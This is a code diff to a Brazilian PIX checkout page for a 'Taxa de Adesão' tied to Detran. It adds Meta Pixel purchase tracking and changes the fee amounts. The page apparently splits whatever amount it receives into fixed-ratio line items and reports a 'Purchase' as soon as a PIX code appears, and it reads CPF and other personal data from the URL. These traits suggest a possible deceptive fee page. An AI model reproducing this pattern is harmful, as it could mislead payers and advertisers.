@@ -339,13 +339,52 @@
   </main>
 
   <script>
+    const META_PIXEL_ID = "1202639988673888";
+    if (!window.fbq) {
+      ((f, b, e, v, n, t, s) => {
+        if (f.fbq) return;
+        n = f.fbq = function () {
+          n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments);
+        };
+        if (!f._fbq) f._fbq = n;
+        n.push = n;
+        n.loaded = true;
+        n.version = "2.0";
+        n.queue = [];
+        t = b.createElement(e);
+        t.async = true;
+        t.src = v;
+        s = b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s);
+      })(window, document, "script", "https://connect.facebook.net/en_US/fbevents.js");
+    }
+    window.fbq("init", META_PIXEL_ID);
+
+    const trackMetaPurchaseFromPix = (amount, dedupeKey, attempt = 0) => {
+      const keySafe = String(dedupeKey || "default").replace(/[^a-zA-Z0-9_-]/g, "").slice(0, 80) || "default";
+      const key = `meta_purchase_pix_${META_PIXEL_ID}_${keySafe}`;
+      if (localStorage.getItem(key)) return;
+      if (typeof window.fbq !== "function") {
+        if (attempt >= 8) return;
+        setTimeout(() => trackMetaPurchaseFromPix(amount, dedupeKey, attempt + 1), 700);
+        return;
+      }
+      const value = Number(String(amount || "0").replace(",", ".")) || 0;
+      window.fbq("trackSingle", META_PIXEL_ID, "Purchase", {
+        value,
+        currency: "BRL",
+        content_type: "product",
+      });
+      localStorage.setItem(key, new Date().toISOString());
+    };
+
     const params = new URLSearchParams(window.location.search);
     const data = {
       cpf: params.get("cpf") || "",
       nome: params.get("nome") || "",
       email: params.get("email") || "",
       phone: params.get("phone") || "",
-      amount: params.get("amount") || "11.47",
+      amount: params.get("amount") || "17.22",
       title: params.get("title") || "Taxa de Adesão",
       uf: params.get("uf") || "",
       detran: params.get("detran") || "",
@@ -385,10 +424,10 @@
     const amountValue = Number(data.amount || 0);
     document.getElementById("amount").textContent = `R$ ${amountValue.toFixed(2)}`.replace(".", ",");
 
-    const baseTotal = 11.47;
+    const baseTotal = 17.22;
     const scale = baseTotal > 0 ? amountValue / baseTotal : 1;
-    const ted = 5.17 * scale;
-    const tsa = 3.10 * scale;
+    const ted = 7.12 * scale;
+    const tsa = 5.00 * scale;
     const tpe = amountValue - ted - tsa;
     document.getElementById("fee-ted").textContent = `R$ ${ted.toFixed(2)}`.replace(".", ",");
     document.getElementById("fee-tsa").textContent = `R$ ${tsa.toFixed(2)}`.replace(".", ",");
@@ -449,6 +488,9 @@
       }
       document.getElementById("pix-code").textContent = json.pix_code || "";
       await renderQr(json.pix_code || "");
+      if (json.pix_code || json.pix_qr_code || json.qr_code) {
+        trackMetaPurchaseFromPix(data.amount, json.transaction_id || json.deposit_id || json.pix_code || "pix-payment");
+      }
     }
 
     document.getElementById("copy").addEventListener("click", async () => {
@@ -462,6 +504,7 @@
     if (data.pixCode) {
       document.getElementById("pix-code").textContent = data.pixCode;
       renderQr(data.pixCode);
+      trackMetaPurchaseFromPix(data.amount, data.tx || data.pixCode || "pix-url");
     } else {
       createPix().catch(() => {});
     }
